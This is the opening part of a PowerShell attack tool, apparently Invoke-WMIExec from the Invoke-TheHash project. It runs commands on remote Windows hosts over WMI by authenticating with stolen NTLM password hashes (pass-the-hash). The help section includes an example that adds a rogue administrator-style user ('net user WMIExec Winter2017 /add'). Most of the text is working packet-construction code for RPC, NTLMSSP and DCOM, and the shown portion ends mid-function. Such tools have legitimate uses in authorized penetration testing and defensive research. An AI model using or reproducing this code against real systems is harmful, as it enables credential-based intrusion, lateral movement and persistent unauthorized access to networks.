function Invoke-WMIExec
{
<#
.SYNOPSIS
Invoke-WMIExec performs WMI command execution on targets using NTLMv2 pass the hash authentication.

.PARAMETER Target
Hostname or IP address of target.

.PARAMETER Username
Username to use for authentication.

.PARAMETER Domain
Domain to use for authentication. This parameter is not needed with local accounts or when using @domain after
the username. 

.PARAMETER Hash
NTLM password hash for authentication. This module will accept either LM:NTLM or NTLM format.

.PARAMETER Command
Command to execute on the target. If a command is not specified, the function will just check to see if the
username and hash has access to WMI on the target.

.PARAMETER Sleep
Default = 10 Milliseconds: Sets the function's Start-Sleep values in milliseconds. You can try tweaking this
setting if you are experiencing strange results.

.EXAMPLE
Invoke-WMIExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command "command or launcher to execute" -verbose

.EXAMPLE
Invoke-WMIExec -Target 192.168.100.20 -Username administrator -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command "cmd.exe /c net user WMIExec Winter2017 /add"

.EXAMPLE
Invoke-WMIExec -Target 192.168.100.20 -Username administrator -Password Test

.LINK
https://github.com/Kevin-Robertson/Invoke-TheHash

#>
[CmdletBinding()]
param
(
    [parameter(Mandatory=$true)][String]$Target,
    [parameter(Mandatory=$true)][String]$Username,
    [parameter(Mandatory=$false)][String]$Domain,
    [parameter(Mandatory=$false)][String]$Command,
    [parameter(Mandatory=$false)][String]$Password,
    [parameter(Mandatory=$false)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash,
    [parameter(Mandatory=$false)][Int]$Sleep=10,
    [parameter(Mandatory=$false)][String]$Name
)

if($Command)
{
    $WMI_execute = $true
}

if(!$Password -and !$Hash){
    exit
}

if($Password){
    $Hash = Get-MD4Hash -DataToHash $([Text.Encoding]::Unicode.GetBytes($Password))
    Write-Output "Hash being used: $Hash"
}

function ConvertFrom-PacketOrderedDictionary
{
    param($packet_ordered_dictionary)

    ForEach($field in $packet_ordered_dictionary.Values)
    {
        $byte_array += $field
    }

    return $byte_array
}

#RPC

function Get-PacketRPCBind()
{
    param([Int]$packet_call_ID,[Byte[]]$packet_max_frag,[Byte[]]$packet_num_ctx_items,[Byte[]]$packet_context_ID,[Byte[]]$packet_UUID,[Byte[]]$packet_UUID_version)

    [Byte[]]$packet_call_ID_bytes = [System.BitConverter]::GetBytes($packet_call_ID)

    $packet_RPCBind = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_RPCBind.Add("RPCBind_Version",[Byte[]](0x05))
    $packet_RPCBind.Add("RPCBind_VersionMinor",[Byte[]](0x00))
    $packet_RPCBind.Add("RPCBind_PacketType",[Byte[]](0x0b))
    $packet_RPCBind.Add("RPCBind_PacketFlags",[Byte[]](0x03))
    $packet_RPCBind.Add("RPCBind_DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
    $packet_RPCBind.Add("RPCBind_FragLength",[Byte[]](0x48,0x00))
    $packet_RPCBind.Add("RPCBind_AuthLength",[Byte[]](0x00,0x00))
    $packet_RPCBind.Add("RPCBind_CallID",$packet_call_ID_bytes)
    $packet_RPCBind.Add("RPCBind_MaxXmitFrag",[Byte[]](0xb8,0x10))
    $packet_RPCBind.Add("RPCBind_MaxRecvFrag",[Byte[]](0xb8,0x10))
    $packet_RPCBind.Add("RPCBind_AssocGroup",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_RPCBind.Add("RPCBind_NumCtxItems",$packet_num_ctx_items)
    $packet_RPCBind.Add("RPCBind_Unknown",[Byte[]](0x00,0x00,0x00))
    $packet_RPCBind.Add("RPCBind_ContextID",$packet_context_ID)
    $packet_RPCBind.Add("RPCBind_NumTransItems",[Byte[]](0x01))
    $packet_RPCBind.Add("RPCBind_Unknown2",[Byte[]](0x00))
    $packet_RPCBind.Add("RPCBind_Interface",$packet_UUID)
    $packet_RPCBind.Add("RPCBind_InterfaceVer",$packet_UUID_version)
    $packet_RPCBind.Add("RPCBind_InterfaceVerMinor",[Byte[]](0x00,0x00))
    $packet_RPCBind.Add("RPCBind_TransferSyntax",[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))
    $packet_RPCBind.Add("RPCBind_TransferSyntaxVer",[Byte[]](0x02,0x00,0x00,0x00))

    if($packet_num_ctx_items[0] -eq 2)
    {
        $packet_RPCBind.Add("RPCBind_ContextID2",[Byte[]](0x01,0x00))
        $packet_RPCBind.Add("RPCBind_NumTransItems2",[Byte[]](0x01))
        $packet_RPCBind.Add("RPCBind_Unknown3",[Byte[]](0x00))
        $packet_RPCBind.Add("RPCBind_Interface2",[Byte[]](0xc4,0xfe,0xfc,0x99,0x60,0x52,0x1b,0x10,0xbb,0xcb,0x00,0xaa,0x00,0x21,0x34,0x7a))
        $packet_RPCBind.Add("RPCBind_InterfaceVer2",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("RPCBind_InterfaceVerMinor2",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("RPCBind_TransferSyntax2",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
    }
    elseif($packet_num_ctx_items[0] -eq 3)
    {
        $packet_RPCBind.Add("RPCBind_ContextID2",[Byte[]](0x01,0x00))
        $packet_RPCBind.Add("RPCBind_NumTransItems2",[Byte[]](0x01))
        $packet_RPCBind.Add("RPCBind_Unknown3",[Byte[]](0x00))
        $packet_RPCBind.Add("RPCBind_Interface2",[Byte[]](0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
        $packet_RPCBind.Add("RPCBind_InterfaceVer2",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("RPCBind_InterfaceVerMinor2",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("RPCBind_TransferSyntax2",[Byte[]](0x33,0x05,0x71,0x71,0xba,0xbe,0x37,0x49,0x83,0x19,0xb5,0xdb,0xef,0x9c,0xcc,0x36))
        $packet_RPCBind.Add("RPCBind_TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_ContextID3",[Byte[]](0x02,0x00))
        $packet_RPCBind.Add("RPCBind_NumTransItems3",[Byte[]](0x01))
        $packet_RPCBind.Add("RPCBind_Unknown4",[Byte[]](0x00))
        $packet_RPCBind.Add("RPCBind_Interface3",[Byte[]](0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
        $packet_RPCBind.Add("RPCBind_InterfaceVer3",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("RPCBind_InterfaceVerMinor3",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("RPCBind_TransferSyntax3",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_TransferSyntaxVer3",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_AuthType",[Byte[]](0x0a))
        $packet_RPCBind.Add("RPCBind_AuthLevel",[Byte[]](0x04))
        $packet_RPCBind.Add("RPCBind_AuthPadLength",[Byte[]](0x00))
        $packet_RPCBind.Add("RPCBind_AuthReserved",[Byte[]](0x00))
        $packet_RPCBind.Add("RPCBind_ContextID4",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
        $packet_RPCBind.Add("RPCBind_MessageType",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_NegotiateFlags",[Byte[]](0x97,0x82,0x08,0xe2))
        $packet_RPCBind.Add("RPCBind_CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_OSVersion",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
    }

    if($packet_call_ID -eq 3)
    {
        $packet_RPCBind.Add("RPCBind_AuthType",[Byte[]](0x0a))
        $packet_RPCBind.Add("RPCBind_AuthLevel",[Byte[]](0x02))
        $packet_RPCBind.Add("RPCBind_AuthPadLength",[Byte[]](0x00))
        $packet_RPCBind.Add("RPCBind_AuthReserved",[Byte[]](0x00))
        $packet_RPCBind.Add("RPCBind_ContextID3",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
        $packet_RPCBind.Add("RPCBind_MessageType",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_NegotiateFlags",[Byte[]](0x97,0x82,0x08,0xe2))
        $packet_RPCBind.Add("RPCBind_CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_OSVersion",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
    }

    return $packet_RPCBind
}

function Get-PacketRPCAUTH3()
{
    param([Byte[]]$packet_NTLMSSP)

    [Byte[]]$packet_NTLMSSP_length = [System.BitConverter]::GetBytes($packet_NTLMSSP.Length)
    $packet_NTLMSSP_length = $packet_NTLMSSP_length[0,1]
    [Byte[]]$packet_RPC_length = [System.BitConverter]::GetBytes($packet_NTLMSSP.Length + 28)
    $packet_RPC_length = $packet_RPC_length[0,1]

    $packet_RPCAuth3 = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_RPCAuth3.Add("RPCAUTH3_Version",[Byte[]](0x05))
    $packet_RPCAuth3.Add("RPCAUTH3_VersionMinor",[Byte[]](0x00))
    $packet_RPCAuth3.Add("RPCAUTH3_PacketType",[Byte[]](0x10))
    $packet_RPCAuth3.Add("RPCAUTH3_PacketFlags",[Byte[]](0x03))
    $packet_RPCAuth3.Add("RPCAUTH3_DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
    $packet_RPCAuth3.Add("RPCAUTH3_FragLength",$packet_RPC_length)
    $packet_RPCAuth3.Add("RPCAUTH3_AuthLength",$packet_NTLMSSP_length)
    $packet_RPCAuth3.Add("RPCAUTH3_CallID",[Byte[]](0x03,0x00,0x00,0x00))
    $packet_RPCAuth3.Add("RPCAUTH3_MaxXmitFrag",[Byte[]](0xd0,0x16))
    $packet_RPCAuth3.Add("RPCAUTH3_MaxRecvFrag",[Byte[]](0xd0,0x16))
    $packet_RPCAuth3.Add("RPCAUTH3_AuthType",[Byte[]](0x0a))
    $packet_RPCAuth3.Add("RPCAUTH3_AuthLevel",[Byte[]](0x02))
    $packet_RPCAuth3.Add("RPCAUTH3_AuthPadLength",[Byte[]](0x00))
    $packet_RPCAuth3.Add("RPCAUTH3_AuthReserved",[Byte[]](0x00))
    $packet_RPCAuth3.Add("RPCAUTH3_ContextID",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_RPCAuth3.Add("RPCAUTH3_NTLMSSP",$packet_NTLMSSP)

    return $packet_RPCAuth3
}

function Get-PacketRPCRequest()
{
    param([Byte[]]$packet_flags,[Int]$packet_service_length,[Int]$packet_auth_length,[Int]$packet_auth_padding,[Byte[]]$packet_call_ID,[Byte[]]$packet_context_ID,[Byte[]]$packet_opnum,[Byte[]]$packet_data)

    if($packet_auth_length -gt 0)
    {
        $packet_full_auth_length = $packet_auth_length + $packet_auth_padding + 8
    }

    [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_service_length + 24 + $packet_full_auth_length + $packet_data.Length)
    [Byte[]]$packet_frag_length = $packet_write_length[0,1]
    [Byte[]]$packet_alloc_hint = [System.BitConverter]::GetBytes($packet_service_length + $packet_data.Length)
    [Byte[]]$packet_auth_length = [System.BitConverter]::GetBytes($packet_auth_length)
    $packet_auth_length = $packet_auth_length[0,1]

    $packet_RPCRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_RPCRequest.Add("RPCRequest_Version",[Byte[]](0x05))
    $packet_RPCRequest.Add("RPCRequest_VersionMinor",[Byte[]](0x00))
    $packet_RPCRequest.Add("RPCRequest_PacketType",[Byte[]](0x00))
    $packet_RPCRequest.Add("RPCRequest_PacketFlags",$packet_flags)
    $packet_RPCRequest.Add("RPCRequest_DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
    $packet_RPCRequest.Add("RPCRequest_FragLength",$packet_frag_length)
    $packet_RPCRequest.Add("RPCRequest_AuthLength",$packet_auth_length)
    $packet_RPCRequest.Add("RPCRequest_CallID",$packet_call_ID)
    $packet_RPCRequest.Add("RPCRequest_AllocHint",$packet_alloc_hint)
    $packet_RPCRequest.Add("RPCRequest_ContextID",$packet_context_ID)
    $packet_RPCRequest.Add("RPCRequest_Opnum",$packet_opnum)

    if($packet_data.Length)
    {
        $packet_RPCRequest.Add("RPCRequest_Data",$packet_data)
    }

    return $packet_RPCRequest
}

function Get-PacketRPCAlterContext()
{
    param([Byte[]]$packet_assoc_group,[Byte[]]$packet_call_ID,[Byte[]]$packet_context_ID,[Byte[]]$packet_interface_UUID)

    $packet_RPCAlterContext = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_RPCAlterContext.Add("RPCAlterContext_Version",[Byte[]](0x05))
    $packet_RPCAlterContext.Add("RPCAlterContext_VersionMinor",[Byte[]](0x00))
    $packet_RPCAlterContext.Add("RPCAlterContext_PacketType",[Byte[]](0x0e))
    $packet_RPCAlterContext.Add("RPCAlterContext_PacketFlags",[Byte[]](0x03))
    $packet_RPCAlterContext.Add("RPCAlterContext_DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
    $packet_RPCAlterContext.Add("RPCAlterContext_FragLength",[Byte[]](0x48,0x00))
    $packet_RPCAlterContext.Add("RPCAlterContext_AuthLength",[Byte[]](0x00,0x00))
    $packet_RPCAlterContext.Add("RPCAlterContext_CallID",$packet_call_ID)
    $packet_RPCAlterContext.Add("RPCAlterContext_MaxXmitFrag",[Byte[]](0xd0,0x16))
    $packet_RPCAlterContext.Add("RPCAlterContext_MaxRecvFrag",[Byte[]](0xd0,0x16))
    $packet_RPCAlterContext.Add("RPCAlterContext_AssocGroup",$packet_assoc_group)
    $packet_RPCAlterContext.Add("RPCAlterContext_NumCtxItems",[Byte[]](0x01))
    $packet_RPCAlterContext.Add("RPCAlterContext_Unknown",[Byte[]](0x00,0x00,0x00))
    $packet_RPCAlterContext.Add("RPCAlterContext_ContextID",$packet_context_ID)
    $packet_RPCAlterContext.Add("RPCAlterContext_NumTransItems",[Byte[]](0x01))
    $packet_RPCAlterContext.Add("RPCAlterContext_Unknown2",[Byte[]](0x00))
    $packet_RPCAlterContext.Add("RPCAlterContext_Interface",$packet_interface_UUID)
    $packet_RPCAlterContext.Add("RPCAlterContext_InterfaceVer",[Byte[]](0x00,0x00))
    $packet_RPCAlterContext.Add("RPCAlterContext_InterfaceVerMinor",[Byte[]](0x00,0x00))
    $packet_RPCAlterContext.Add("RPCAlterContext_TransferSyntax",[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))
    $packet_RPCAlterContext.Add("RPCAlterContext_TransferSyntaxVer",[Byte[]](0x02,0x00,0x00,0x00))

    return $packet_RPCAlterContext
}

function Get-PacketNTLMSSPVerifier()
{
    param([Int]$packet_auth_padding,[Byte[]]$packet_auth_level,[Byte[]]$packet_sequence_number)

    $packet_NTLMSSPVerifier = New-Object System.Collections.Specialized.OrderedDictionary

    if($packet_auth_padding -eq 4)
    {
        $packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_AuthPadding",[Byte[]](0x00,0x00,0x00,0x00))
        [Byte[]]$packet_auth_pad_length = 0x04
    }
    elseif($packet_auth_padding -eq 8)
    {
        $packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_AuthPadding",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        [Byte[]]$packet_auth_pad_length = 0x08
    }
    elseif($packet_auth_padding -eq 12)
    {
        $packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_AuthPadding",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        [Byte[]]$packet_auth_pad_length = 0x0c
    }
    else
    {
        [Byte[]]$packet_auth_pad_length = 0x00
    }

    $packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_AuthType",[Byte[]](0x0a))
    $packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_AuthLevel",$packet_auth_level)
    $packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_AuthPadLen",$packet_auth_pad_length)
    $packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_AuthReserved",[Byte[]](0x00))
    $packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_AuthContextID",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_NTLMSSPVerifierVersionNumber",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_NTLMSSPVerifierChecksum",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_NTLMSSPVerifierSequenceNumber",$packet_sequence_number)

    return $packet_NTLMSSPVerifier
}

function Get-PacketDCOMRemQueryInterface()
{
    param([Byte[]]$packet_causality_ID,[Byte[]]$packet_IPID,[Byte[]]$packet_IID)

    $packet_DCOMRemQueryInterface = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_VersionMajor",[Byte[]](0x05,0x00))
    $packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_VersionMinor",[Byte[]](0x07,0x00))
    $packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_Flags",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_Reserved",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_CausalityID",$packet_causality_ID)
    $packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_Reserved2",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_IPID",$packet_IPID)
    $packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_Refs",[Byte[]](0x05,0x00,0x00,0x00))
    $packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_IIDs",[Byte[]](0x01,0x00))
    $packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_Unknown",[Byte[]](0x00,0x00,0x01,0x00,0x00,0x00))
    $packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_IID",$packet_IID)

    return $packet_DCOMRemQueryInterface
}

function Get-PacketDCOMRemRelease()
{
    param([Byte[]]$packet_causality_ID,[Byte[]]$packet_IPID,[Byte[]]$packet_IPID2)

    $packet_DCOMRemRelease = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_DCOMRemRelease.Add("DCOMRemRelease_VersionMajor",[Byte[]](0x05,0x00))
    $packet_DCOMRemRelease.Add("DCOMRemRelease_VersionMinor",[Byte[]](0x07,0x00))
    $packet_DCOMRemRelease.Add("DCOMRemRelease_Flags",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemRelease.Add("DCOMRemRelease_Reserved",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemRelease.Add("DCOMRemRelease_CausalityID",$packet_causality_ID)
    $packet_DCOMRemRelease.Add("DCOMRemRelease_Reserved2",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemRelease.Add("DCOMRemRelease_Unknown",[Byte[]](0x02,0x00,0x00,0x00))
    $packet_DCOMRemRelease.Add("DCOMRemRelease_InterfaceRefs",[Byte[]](0x02,0x00,0x00,0x00))
    $packet_DCOMRemRelease.Add("DCOMRemRelease_IPID",$packet_IPID)
    $packet_DCOMRemRelease.Add("DCOMRemRelease_PublicRefs",[Byte[]](0x05,0x00,0x00,0x00))
    $packet_DCOMRemRelease.Add("DCOMRemRelease_PrivateRefs",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemRelease.Add("DCOMRemRelease_IPID2",$packet_IPID2)
    $packet_DCOMRemRelease.Add("DCOMRemRelease_PublicRefs2",[Byte[]](0x05,0x00,0x00,0x00))
    $packet_DCOMRemRelease.Add("DCOMRemRelease_PrivateRefs2",[Byte[]](0x00,0x00,0x00,0x00))

    return $packet_DCOMRemRelease
}

function Get-PacketDCOMRemoteCreateInstance()
{
    param([Byte[]]$packet_causality_ID,[String]$packet_target)

    [Byte[]]$packet_target_unicode = [System.Text.Encoding]::Unicode.GetBytes($packet_target)
    [Byte[]]$packet_target_length = [System.BitConverter]::GetBytes($packet_target.Length + 1)
    $packet_target_unicode += ,0x00 * (([Math]::Truncate($packet_target_unicode.Length / 8 + 1) * 8) - $packet_target_unicode.Length)
    [Byte[]]$packet_cntdata = [System.BitConverter]::GetBytes($packet_target_unicode.Length + 720)
    [Byte[]]$packet_size = [System.BitConverter]::GetBytes($packet_target_unicode.Length + 680)
    [Byte[]]$packet_total_size = [System.BitConverter]::GetBytes($packet_target_unicode.Length + 664)
    [Byte[]]$packet_private_header = [System.BitConverter]::GetBytes($packet_target_unicode.Length + 40) + 0x00,0x00,0x00,0x00
    [Byte[]]$packet_property_data_size = [System.BitConverter]::GetBytes($packet_target_unicode.Length + 56)

    $packet_DCOMRemoteCreateInstance = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_DCOMVersionMajor",[Byte[]](0x05,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_DCOMVersionMinor",[Byte[]](0x07,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_DCOMFlags",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_DCOMReserved",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_DCOMCausalityID",$packet_causality_ID)
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_Unknown",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_Unknown2",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_Unknown3",[Byte[]](0x00,0x00,0x02,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_Unknown4",$packet_cntdata)
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCntData",$packet_cntdata)
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesOBJREFSignature",[Byte[]](0x4d,0x45,0x4f,0x57))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesOBJREFFlags",[Byte[]](0x04,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesOBJREFIID",[Byte[]](0xa2,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFCLSID",[Byte[]](0x38,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFCBExtension",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFSize",$packet_size)
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesTotalSize",$packet_total_size)
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesReserved",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderPrivateHeader",[Byte[]](0xb0,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderTotalSize",$packet_total_size)
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderCustomHeaderSize",[Byte[]](0xc0,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderReserved",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesDestinationContext",[Byte[]](0x02,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesNumActivationPropertyStructs",[Byte[]](0x06,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsInfoClsid",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrReferentID",[Byte[]](0x00,0x00,0x02,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrReferentID",[Byte[]](0x04,0x00,0x02,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesNULLPointer",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrMaxCount",[Byte[]](0x06,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid",[Byte[]](0xb9,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid2",[Byte[]](0xab,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid3",[Byte[]](0xa5,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid4",[Byte[]](0xa6,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid5",[Byte[]](0xa4,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid6",[Byte[]](0xaa,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrMaxCount",[Byte[]](0x06,0x00,0x00,0x00))
